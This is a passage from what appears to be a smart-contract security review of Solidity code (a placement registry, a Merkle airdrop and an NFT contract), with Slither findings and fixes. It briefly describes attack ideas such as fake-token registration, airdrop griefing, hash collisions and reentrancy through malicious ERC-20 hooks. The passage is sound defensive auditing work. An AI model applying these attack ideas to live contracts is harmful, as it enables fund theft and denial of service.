&lt;p&gt;What is the purpose of using Items for ItemtId in Items library? (Give an extended explanation and specify the line in the code).&lt;&#x2F;p&gt;
&lt;ul&gt;
&lt;li&gt;By &lt;code&gt;using Items for ItemId&lt;&#x2F;code&gt;, the ItemId struct gains access to functions defined within the Items library. This extends the functionality of the ItemId struct without directly modifying its definition.&lt;&#x2F;li&gt;
&lt;li&gt;By extending &lt;code&gt;ItemId&lt;&#x2F;code&gt; with the Items library, functions like token and hash become directly accessible to instances of ItemId.&lt;&#x2F;li&gt;
&lt;li&gt;In line 40 &lt;code&gt;address itemToken = item.id.token();&lt;&#x2F;code&gt; is used to fetch the &lt;code&gt;itemToken&lt;&#x2F;code&gt;.&lt;&#x2F;li&gt;
&lt;li&gt;The &lt;code&gt;token()&lt;&#x2F;code&gt; function is available to call on &lt;code&gt;item.id&lt;&#x2F;code&gt; which is nothing but the &lt;code&gt;ItemId&lt;&#x2F;code&gt; instance.&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;p&gt;How is the placement fee deducted? Who is it paid from and to whom? How are msg.sender and address(this) changed with each external call? (Give a detailed explanation)&lt;&#x2F;p&gt;
&lt;ul&gt;
&lt;li&gt;The registration can be done by using this contract,&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
&lt;pre style=&quot;background-color:#fafafa;color:#61676c;&quot;&gt;&lt;code&gt;&lt;span&gt;contract Manager is ManagerStorage{
&lt;&#x2F;span&gt;&lt;span&gt;    function registerPlacement(Placements.Placement memory placement) public returns (uint256 placementId) {
&lt;&#x2F;span&gt;&lt;span&gt;        placementId = Placements.register(_placementRegistry, placement);
&lt;&#x2F;span&gt;&lt;span&gt;    }
&lt;&#x2F;span&gt;&lt;span&gt;}
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;ul&gt;
&lt;li&gt;Manager contract will takes the Placement struct and calls the &lt;code&gt;register()&lt;&#x2F;code&gt; function of librar &lt;code&gt;Placements&lt;&#x2F;code&gt;.&lt;&#x2F;li&gt;
&lt;li&gt;The first paramenter is the &lt;code&gt;Registry&lt;&#x2F;code&gt; struct and the second one is &lt;code&gt;Placements&lt;&#x2F;code&gt; struct.&lt;&#x2F;li&gt;
&lt;li&gt;The &lt;code&gt;fee&lt;&#x2F;code&gt; amount of &lt;code&gt;token&lt;&#x2F;code&gt; will be paid from &lt;code&gt;msg.sender&lt;&#x2F;code&gt; to the &lt;code&gt;Manager&lt;&#x2F;code&gt; contract.&lt;&#x2F;li&gt;
&lt;li&gt;The &lt;code&gt;msg.sender&lt;&#x2F;code&gt; will always the caller of the &lt;code&gt;registerPlacement()&lt;&#x2F;code&gt; function. And the &lt;code&gt;this&lt;&#x2F;code&gt; will be the address of &lt;code&gt;Manager()&lt;&#x2F;code&gt; contract.&lt;&#x2F;li&gt;
&lt;li&gt;This is because when calling public or external functions of libraries, &lt;code&gt;DELEGATECALL&lt;&#x2F;code&gt; will be made to the library.&lt;&#x2F;li&gt;
&lt;li&gt;What delegatecall does is, it maintains the context of call. That is the &lt;code&gt;msg.sender&lt;&#x2F;code&gt;. So, everytime the &lt;code&gt;register()&lt;&#x2F;code&gt; function of Placement library is called, the &lt;code&gt;msg.sender&lt;&#x2F;code&gt; will be the actual caller of the &lt;code&gt;registerPlacement()&lt;&#x2F;code&gt; function.&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
&lt;&#x2F;li&gt;
&lt;&#x2F;ol&gt;
&lt;h2 id=&quot;vulnerabilities-1&quot;&gt;&lt;a class=&quot;zola-anchor&quot; href=&quot;#vulnerabilities-1&quot; aria-label=&quot;Anchor link for: vulnerabilities-1&quot;&gt;Vulnerabilities&lt;&#x2F;a&gt;&lt;&#x2F;h2&gt;
&lt;ul&gt;
&lt;li&gt;The system id vulnerable, in such a that it can accept any tokens, An attacker could deploy a fake token and can register the placement.&lt;&#x2F;li&gt;
&lt;li&gt;Attacker could even DOS the protocol by passing huge number of items array.&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
&lt;h1 id=&quot;airdrop&quot;&gt;&lt;a class=&quot;zola-anchor&quot; href=&quot;#airdrop&quot; aria-label=&quot;Anchor link for: airdrop&quot;&gt;Airdrop&lt;&#x2F;a&gt;&lt;&#x2F;h1&gt;
&lt;h2 id=&quot;description-3&quot;&gt;&lt;a class=&quot;zola-anchor&quot; href=&quot;#description-3&quot; aria-label=&quot;Anchor link for: description-3&quot;&gt;Description&lt;&#x2F;a&gt;&lt;&#x2F;h2&gt;
&lt;p&gt;The Airdrop contract implements a Merkle tree for ERC20 pull-based airdrops.  Merkle trees used in airdrops , since Merkle proofs allow us to very efficiently implement ERC20 token airdrops. The implementation simple using Openzeppelin MerkleProof library. The &lt;code&gt;Airdrop&lt;&#x2F;code&gt; contract imports &lt;code&gt;MerkleProof&lt;&#x2F;code&gt; and &lt;code&gt;SafeERC20&lt;&#x2F;code&gt; contracts. It stores &lt;code&gt;token&lt;&#x2F;code&gt; address and merkleroot. And implements a &lt;code&gt;claim()&lt;&#x2F;code&gt; function for users to pass their merkleproof and amount to claim their tokens.&lt;&#x2F;p&gt;
&lt;h2 id=&quot;vulnerabilities-2&quot;&gt;&lt;a class=&quot;zola-anchor&quot; href=&quot;#vulnerabilities-2&quot; aria-label=&quot;Anchor link for: vulnerabilities-2&quot;&gt;Vulnerabilities&lt;&#x2F;a&gt;&lt;&#x2F;h2&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;First of all, the initial check &lt;code&gt;require(_erc20.balanceOf(msg.sender) == 0);&lt;&#x2F;code&gt; stops users claiming their tokens even if they haven&#x27;t claimed it before.&lt;&#x2F;p&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;p&gt;An attacker can claim his tokens initially and sends at least &lt;code&gt;1&lt;&#x2F;code&gt; token to the other user, in this case the user cannot claim their tokens.&lt;&#x2F;p&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;p&gt;So, this is not an efficient check to find the user already claimed the tokens or not.&lt;&#x2F;p&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;p&gt;Instead we can keep a mapping to check the claim status of the users.&lt;&#x2F;p&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;p&gt;And the verification process also incorrectly finding the node.&lt;&#x2F;p&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;p&gt;&lt;code&gt;keccak256(abi.encode(msg.sender))&lt;&#x2F;code&gt; is the node being verified. But this is not the correct way to check, it should include the &lt;code&gt;amount&lt;&#x2F;code&gt;.&lt;&#x2F;p&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;p&gt;Also, as per OpenZeppelin docs it is suggested to use the following line to extract the leaf node.&lt;&#x2F;p&gt;
&lt;p&gt;&lt;code&gt;bytes32 leaf = keccak256(bytes.concat(keccak256(abi.encode(addr, amount))));&lt;&#x2F;code&gt;&lt;&#x2F;p&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;p&gt;And check the balance of the Airdrop contract.&lt;&#x2F;p&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;p&gt;Fixed code :&lt;&#x2F;p&gt;
&lt;pre style=&quot;background-color:#fafafa;color:#61676c;&quot;&gt;&lt;code&gt;&lt;span&gt;&#x2F;&#x2F; SPDX-License-Identifier: UNLICENSED
&lt;&#x2F;span&gt;&lt;span&gt;pragma solidity ^0.8.9;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;import &amp;quot;@openzeppelin&#x2F;contracts&#x2F;utils&#x2F;cryptography&#x2F;MerkleProof.sol&amp;quot;;
&lt;&#x2F;span&gt;&lt;span&gt;import &amp;quot;@openzeppelin&#x2F;contracts&#x2F;token&#x2F;ERC20&#x2F;IERC20.sol&amp;quot;;
&lt;&#x2F;span&gt;&lt;span&gt;import &amp;quot;@openzeppelin&#x2F;contracts&#x2F;token&#x2F;ERC20&#x2F;utils&#x2F;SafeERC20.sol&amp;quot;;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;contract Airdrop {
&lt;&#x2F;span&gt;&lt;span&gt;    using MerkleProof for bytes32[];
&lt;&#x2F;span&gt;&lt;span&gt;    using SafeERC20 for IERC20;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    bytes32 private _merkleTreeRoot;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    IERC20 private _erc20;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    mapping (address =&amp;gt; bool) private isClaimed;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    event Claim(address indexed who, uint256 amount);
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    constructor(IERC20 erc20, bytes32 merkleTreeRoot) {
&lt;&#x2F;span&gt;&lt;span&gt;        _erc20 = erc20;
&lt;&#x2F;span&gt;&lt;span&gt;        _merkleTreeRoot = merkleTreeRoot;
&lt;&#x2F;span&gt;&lt;span&gt;    }
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    function claim(uint256 amount, bytes32[] calldata proof) external {
&lt;&#x2F;span&gt;&lt;span&gt;        require(!isClaimed[msg.sender], &amp;quot;Already claimed&amp;quot;);
&lt;&#x2F;span&gt;&lt;span&gt;        require(amount &amp;lt;= _erc20.balanceOf(address(this)), &amp;quot;Out of tokens&amp;quot; );
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;        bytes32 leaf = keccak256(bytes.concat(keccak256(abi.encode(msg.sender, amount))));
&lt;&#x2F;span&gt;&lt;span&gt;        &#x2F;&#x2F;bytes32 leaf = keccak256(abi.encode(msg.sender, amount)); &#x2F;&#x2F; this will also works
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;        require(proof.verify(_merkleTreeRoot, leaf), &amp;quot;User was not found&amp;quot;);
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;        isClaimed[msg.sender] = true;
&lt;&#x2F;span&gt;&lt;span&gt;        _erc20.safeTransfer(msg.sender, amount);
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;        emit Claim(msg.sender, amount);
&lt;&#x2F;span&gt;&lt;span&gt;    }
&lt;&#x2F;span&gt;&lt;span&gt;}
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
&lt;h1 id=&quot;nft&quot;&gt;&lt;a class=&quot;zola-anchor&quot; href=&quot;#nft&quot; aria-label=&quot;Anchor link for: nft&quot;&gt;NFT&lt;&#x2F;a&gt;&lt;&#x2F;h1&gt;
&lt;h2 id=&quot;description-observations&quot;&gt;&lt;a class=&quot;zola-anchor&quot; href=&quot;#description-observations&quot; aria-label=&quot;Anchor link for: description-observations&quot;&gt;Description &amp;amp; Observations&lt;&#x2F;a&gt;&lt;&#x2F;h2&gt;
&lt;p&gt;First of all the NFT.sol uses the compiler version &lt;code&gt;^0.8.2&lt;&#x2F;code&gt;. It imported many external openzeppelin library contracts. The &lt;code&gt;IERC2981Royalties&lt;&#x2F;code&gt;, &lt;code&gt;IRoyaltiesProvider&lt;&#x2F;code&gt;, &lt;code&gt;RoyaltiesV2&lt;&#x2F;code&gt; interfaces, &lt;code&gt;ERC2981Base&lt;&#x2F;code&gt;, &lt;code&gt;AbstractRoyalties&lt;&#x2F;code&gt; abstract contracts, &lt;code&gt;LibPart&lt;&#x2F;code&gt;, &lt;code&gt;LibRoyaltiesV2&lt;&#x2F;code&gt;, libraries and &lt;code&gt;NFT&lt;&#x2F;code&gt; contract were defined. It uses role based access control on functions. At an high level the NFT contracts implements an ERC721 token standard.&lt;&#x2F;p&gt;
&lt;h2 id=&quot;configuration&quot;&gt;&lt;a class=&quot;zola-anchor&quot; href=&quot;#configuration&quot; aria-label=&quot;Anchor link for: configuration&quot;&gt;Configuration&lt;&#x2F;a&gt;&lt;&#x2F;h2&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;To install dependencies of NFT.sol run following command.&lt;&#x2F;p&gt;
&lt;p&gt;&lt;code&gt;npm i @openzeppelin&#x2F;contracts@4.9.0-rc.0 --save-dev&lt;&#x2F;code&gt;&lt;&#x2F;p&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;p&gt;Install &lt;code&gt;solc-select&lt;&#x2F;code&gt; and &lt;code&gt;0.8.2&lt;&#x2F;code&gt; solc version&lt;&#x2F;p&gt;
&lt;p&gt;&lt;code&gt;pip3 install solc-select&lt;&#x2F;code&gt;&lt;&#x2F;p&gt;
&lt;p&gt;&lt;code&gt;solc-select install 0.8.2&lt;&#x2F;code&gt;&lt;&#x2F;p&gt;
&lt;p&gt;&lt;code&gt;solc-select use 0.8.2&lt;&#x2F;code&gt;&lt;&#x2F;p&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;p&gt;Run slither&lt;&#x2F;p&gt;
&lt;p&gt;&lt;code&gt;slither . --solc-disable-warnings --exclude-informational&lt;&#x2F;code&gt;&lt;&#x2F;p&gt;
&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
&lt;h2 id=&quot;slither-output-validation&quot;&gt;&lt;a class=&quot;zola-anchor&quot; href=&quot;#slither-output-validation&quot; aria-label=&quot;Anchor link for: slither-output-validation&quot;&gt;Slither Output &amp;amp; Validation&lt;&#x2F;a&gt;&lt;&#x2F;h2&gt;
&lt;ol&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;[HIGH] Nft.withdraw() (src&#x2F;NFT&#x2F;NFT.sol#328-332) sends eth to arbitrary user.&lt;&#x2F;strong&gt;&lt;&#x2F;p&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;The vulnerability is because of unprotected call to a function sending Ether to an arbitrary address.&lt;&#x2F;p&gt;
&lt;pre style=&quot;background-color:#fafafa;color:#61676c;&quot;&gt;&lt;code&gt;&lt;span&gt;&#x2F;&#x2F;&#x2F; @dev owner can withdraw Ether sent to the contract
&lt;&#x2F;span&gt;&lt;span&gt;function withdraw() public onlyRole(CEO) {
&lt;&#x2F;span&gt;&lt;span&gt;    uint256 balance = address(this).balance;
&lt;&#x2F;span&gt;&lt;span&gt;    require(balance != 0);
&lt;&#x2F;span&gt;&lt;span&gt;    payable(msg.sender).transfer(balance);
&lt;&#x2F;span&gt;&lt;span&gt;}
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;p&gt;The &lt;code&gt;withdraw()&lt;&#x2F;code&gt; function should send the contract balance to the &lt;code&gt;owner&lt;&#x2F;code&gt;. Here, the balance was sent to the &lt;code&gt;msg.sender&lt;&#x2F;code&gt;.&lt;&#x2F;p&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;p&gt;Only callers who have the &lt;code&gt;CEO&lt;&#x2F;code&gt; role can call the &lt;code&gt;withdraw()&lt;&#x2F;code&gt; function.&lt;&#x2F;p&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;p&gt;The &lt;code&gt;CEO&lt;&#x2F;code&gt; role was assigned to the contract deployer. The actual owner is also the contract deployer.&lt;&#x2F;p&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;p&gt;So, &lt;code&gt;msg.sender&lt;&#x2F;code&gt; will be the &lt;code&gt;owner&lt;&#x2F;code&gt; or &lt;code&gt;CEO&lt;&#x2F;code&gt;.&lt;&#x2F;p&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;p&gt;If any unwanted bypass has been done to the &lt;code&gt;onlyRole(CEO)&lt;&#x2F;code&gt;, the funds will be lost.&lt;&#x2F;p&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;p&gt;Its recommended to send the balance to the &lt;code&gt;owner&lt;&#x2F;code&gt; instead of &lt;code&gt;msg.sender&lt;&#x2F;code&gt;.&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;diff&quot; style=&quot;background-color:#fafafa;color:#61676c;&quot; class=&quot;language-diff &quot;&gt;&lt;code class=&quot;language-diff&quot; data-lang=&quot;diff&quot;&gt;&lt;span&gt;&#x2F;&#x2F;&#x2F; @dev owner can withdraw Ether sent to the contract
&lt;&#x2F;span&gt;&lt;span&gt;function withdraw() public onlyRole(CEO) {
&lt;&#x2F;span&gt;&lt;span&gt;    uint256 balance = address(this).balance;
&lt;&#x2F;span&gt;&lt;span&gt;    require(balance != 0);
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f07171;&quot;&gt;-    payable(msg.sender).transfer(balance);
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;+    payable(owner).transfer(balance);
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;}
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;[HIGH] Nft.tokenURI(uint256) (src&#x2F;NFT&#x2F;NFT.sol#235-243) calls abi.encodePacked() with multiple dynamic arguments.&lt;&#x2F;strong&gt;&lt;&#x2F;p&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;The vulnerability is a collision due to dynamic type usages in abi.encodePacked&lt;&#x2F;p&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;p&gt;As the solidity docs describe, two or more dynamic types are passed to abi.encodePacked. Moreover, these dynamic values are user-specified function arguments in external functions, meaning anyone can directly specify the value of these arguments when calling the function.&lt;&#x2F;p&gt;
&lt;pre style=&quot;background-color:#fafafa;color:#61676c;&quot;&gt;&lt;code&gt;&lt;span&gt;function tokenURI(uint256 _tokenId)
&lt;&#x2F;span&gt;&lt;span&gt;    public
&lt;&#x2F;span&gt;&lt;span&gt;    view
&lt;&#x2F;span&gt;&lt;span&gt;    override(ERC721, ERC721URIStorage)
&lt;&#x2F;span&gt;&lt;span&gt;    returns (string memory)
&lt;&#x2F;span&gt;&lt;span&gt;{
&lt;&#x2F;span&gt;&lt;span&gt;    string memory _str = Strings.toString(_tokenId);
&lt;&#x2F;span&gt;&lt;span&gt;    return string(abi.encodePacked(baseUri, _str, suffix));
&lt;&#x2F;span&gt;&lt;span&gt;}
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;p&gt;Here the vulnerability has no effect, because the abi.encodePacked is not dealing with user specifed dynamic inputs.&lt;&#x2F;p&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;p&gt;But, it missing a minor check of the &lt;code&gt;baseUri&lt;&#x2F;code&gt; length.&lt;&#x2F;p&gt;
&lt;p&gt;&lt;code&gt;return baseUri.length &amp;gt; 0 ? string(abi.encodePacked(baseUri, _str, suffix)): &quot;&quot; ;&lt;&#x2F;code&gt;&lt;&#x2F;p&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;p&gt;The usage of the &lt;code&gt;abi.encodePacked&lt;&#x2F;code&gt; becomes vulnerable in the case of hash verification.&lt;&#x2F;p&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;p&gt;If you use &lt;code&gt;keccak256(abi.encodePacked(a, b))&lt;&#x2F;code&gt; and both a and b are dynamic types, it is easy to craft collisions in the hash value by moving parts of &lt;code&gt;a&lt;&#x2F;code&gt; into &lt;code&gt;b&lt;&#x2F;code&gt; and vice-versa.&lt;&#x2F;p&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;p&gt;More specifically, &lt;code&gt;abi.encodePacked(&quot;a&quot;, &quot;bc&quot;) == abi.encodePacked(&quot;ab&quot;, &quot;c&quot;)&lt;&#x2F;code&gt;.&lt;&#x2F;p&gt;
&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;[MEDIUM] Reentrancy in Nft.summon(address,uint256) (src&#x2F;NFT&#x2F;NFT.sol#189-220)&lt;&#x2F;strong&gt;&lt;&#x2F;p&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;Slither found this as vulnerability because the state variable updates were done after the external calls.&lt;&#x2F;p&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;p&gt;The external calls was done on a token functions, they are not the low level &lt;code&gt;call&lt;&#x2F;code&gt;&#x27;s.&lt;&#x2F;p&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;p&gt;There is no high severity in this vulnerability because, the &lt;code&gt;transferFrom&lt;&#x2F;code&gt; function doesnt invoke any fallback of the caller.&lt;&#x2F;p&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;p&gt;However attacker could write a malicious ERC-20 with custom transferFrom() or approve() that have re-entrancy hooks to attack a target.&lt;&#x2F;p&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;p&gt;To do this, attacker has to update the &lt;code&gt;utilityToken&lt;&#x2F;code&gt; or &lt;code&gt;governanceToken&lt;&#x2F;code&gt; address. This can only done by the users with role &lt;code&gt;CLEVEL&lt;&#x2F;code&gt;&lt;&#x2F;p&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;p&gt;To mitigate these possible attacks we can follow the CEI pattern.&lt;&#x2F;p&gt;
&lt;pre style=&quot;background-color:#fafafa;color:#61676c;&quot;&gt;&lt;code&gt;&lt;span&gt;    function summon(address _to, uint256 _tokenId) external whenNotPaused payable {
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;        require(summoningEnabled, &amp;#39;Summoning is currently disabled&amp;#39;);
&lt;&#x2F;span&gt;&lt;span&gt;        require(_exists(_tokenId), &amp;#39;Token does not exist&amp;#39;);
&lt;&#x2F;span&gt;&lt;span&gt;        require(ownerOf(_tokenId) == msg.sender, &amp;#39;Sender is not the token owner&amp;#39;);
&lt;&#x2F;span&gt;&lt;span&gt;        require(items[_tokenId].lastSummoned + summoningLock &amp;lt; block.timestamp, &amp;#39;Need to wait to summon&amp;#39;);
&lt;&#x2F;span&gt;&lt;span&gt;        require(items[_tokenId].summonCount &amp;lt; maxSummoningCount, &amp;#39;Exceeded Summoning Count&amp;#39;);
&lt;&#x2F;span&gt;&lt;span&gt;        
&lt;&#x2F;span&gt;&lt;span&gt;        uint256 utilitySummoningFee = summoningCosts[utilityToken][items[_tokenId].summonCount];
&lt;&#x2F;span&gt;&lt;span&gt;        uint256 governanceSummoningFee = summoningCosts[governanceToken][items[_tokenId].summonCount];
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;        &#x2F;&#x2F; Push a summoned token to the items array
&lt;&#x2F;span&gt;&lt;span&gt;        items.push(Item(block.timestamp, 0, 0, _tokenId, true));
&lt;&#x2F;span&gt;&lt;span&gt;        items[_tokenId].summonCount++;
&lt;&#x2F;span&gt;&lt;span&gt;        items[_tokenId].lastSummoned = block.timestamp;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;        if(utilitySummoningFee &amp;gt; 0) {
&lt;&#x2F;span&gt;&lt;span&gt;            require(ERC20(address(utilityToken)).transferFrom(msg.sender, address(this), utilitySummoningFee), &amp;quot;Transfer failed&amp;quot;);    
&lt;&#x2F;span&gt;&lt;span&gt;        }
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;        if(governanceSummoningFee &amp;gt; 0) {
&lt;&#x2F;span&gt;&lt;span&gt;            require(ERC20(address(governanceToken)).transferFrom(msg.sender, address(this), governanceSummoningFee), &amp;quot;Transfer failed&amp;quot;);
&lt;&#x2F;span&gt;&lt;span&gt;        }
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;        &#x2F;&#x2F; Mint the new summoned token        
&lt;&#x2F;span&gt;&lt;span&gt;        uint256 tokenId = _tokenIdCounter.current();
&lt;&#x2F;span&gt;&lt;span&gt;        _tokenIdCounter.increment();
&lt;&#x2F;span&gt;&lt;span&gt;        _safeMint(_to, tokenId);
&lt;&#x2F;span&gt;&lt;span&gt;        
&lt;&#x2F;span&gt;&lt;span&gt;        emit Summoned(msg.sender, _to, tokenId);
&lt;&#x2F;span&gt;&lt;span&gt;    }
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;[LOW] Nft.royaltyInfo(uint256,uint256).royalties (src&#x2F;NFT&#x2F;NFT.sol#356) shadows&lt;&#x2F;strong&gt;&lt;&#x2F;p&gt;
&lt;ul&gt;
&lt;li&gt;This is a variable shadowing vulnerability&lt;&#x2F;li&gt;
&lt;li&gt;&lt;code&gt;royalties&lt;&#x2F;code&gt; variable in &lt;code&gt;AbstractRoyalties&lt;&#x2F;code&gt; in line 85 is being shadowed by the &lt;code&gt;royalties&lt;&#x2F;code&gt; variable at line 356.&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;[LOW] Nft.updateUtilityAddress(address)._address (src&#x2F;NFT&#x2F;NFT.sol#278) lacks a zero-check on&lt;&#x2F;strong&gt;&lt;&#x2F;p&gt;
&lt;ul&gt;
&lt;li&gt;Lack of zero address check of &lt;code&gt;_address&lt;&#x2F;code&gt; in &lt;code&gt;updateUtilityAddress()&lt;&#x2F;code&gt; function.&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;[LOW] Nft.updateGovernanceAddress(address)._address (src&#x2F;NFT&#x2F;NFT.sol#284) lacks a zero-check on&lt;&#x2F;strong&gt;&lt;&#x2F;p&gt;
&lt;ul&gt;
&lt;li&gt;Lack of zero address check of &lt;code&gt;_address&lt;&#x2F;code&gt; in &lt;code&gt;updateGovernanceAddress()&lt;&#x2F;code&gt; function.&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;[LOW] Nft.setOwner(address)._owner (src&#x2F;NFT&#x2F;NFT.sol#316) lacks a zero-check on&lt;&#x2F;strong&gt;&lt;&#x2F;p&gt;
&lt;ul&gt;
&lt;li&gt;Zero address check has to be done when updating new &lt;code&gt;owner&lt;&#x2F;code&gt; in &lt;code&gt;setOwner()&lt;&#x2F;code&gt; function.&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;[LOW] Nft.updateRoyaltyAddress(address)._address (src&#x2F;NFT&#x2F;NFT.sol#363) lacks a zero-check on&lt;&#x2F;strong&gt;&lt;&#x2F;p&gt;
&lt;ul&gt;
&lt;li&gt;No zero address check of new royalty address in &lt;code&gt;updateRoyaltyAddress&lt;&#x2F;code&gt;.&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;[LOW] Reentrancy in Nft.safeMint(address) (src&#x2F;NFT&#x2F;NFT.sol#181-187)&lt;&#x2F;strong&gt;&lt;&#x2F;p&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;Again slither marking this as a reentrancy, because the sate variable updation was done after the external call.&lt;&#x2F;p&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;p&gt;Update the function as follows&lt;&#x2F;p&gt;
&lt;pre style=&quot;background-color:#fafafa;color:#61676c;&quot;&gt;&lt;code&gt;&lt;span&gt;function safeMint(address _to) public whenNotPaused onlyRole(CLEVEL) {
&lt;&#x2F;span&gt;&lt;span&gt;    uint256 tokenId = _tokenIdCounter.current();
&lt;&#x2F;span&gt;&lt;span&gt;    _tokenIdCounter.increment();
&lt;&#x2F;span&gt;&lt;span&gt;    items.push(Item(block.timestamp, 0, 0, 0, false));
&lt;&#x2F;span&gt;&lt;span&gt;    _safeMint(_to, tokenId);
&lt;&#x2F;span&gt;&lt;span&gt;    emit AdminMinted(msg.sender, _to, tokenId);
&lt;&#x2F;span&gt;&lt;span&gt;}
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;[LOW] Nft.summon(address,uint256) (src&#x2F;NFT&#x2F;NFT.sol#189-220) uses timestamp for comparisons.&lt;&#x2F;strong&gt;&lt;&#x2F;p&gt;
&lt;ul&gt;
&lt;li&gt;The usage of &lt;code&gt;block.timestamp&lt;&#x2F;code&gt; for deadline check can be exploited by the malicious validators.&lt;&#x2F;li&gt;
